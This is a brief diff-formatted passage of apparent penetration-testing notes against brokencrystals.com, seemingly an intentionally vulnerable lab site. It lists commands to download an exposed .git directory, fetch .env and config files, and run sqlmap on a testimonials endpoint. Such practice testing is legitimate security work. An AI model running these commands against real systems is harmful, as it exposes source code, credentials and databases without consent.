@@ -1,0 +1,17 @@
+# Download the .git directory
+wget -r https://brokencrystals.com/.git/
+
+# Check the .env file
+curl https://brokencrystals.com/.env
+
+# View config files
+curl https://brokencrystals.com/config.json
+
+
+
+3. Manual Vulnerability Testing
+SQL Injection Testing:
+bash
+
+# Test the suspicious endpoint
+sqlmap -u "https://brokencrystals.com/api/testimonials/count?query=1" --batch
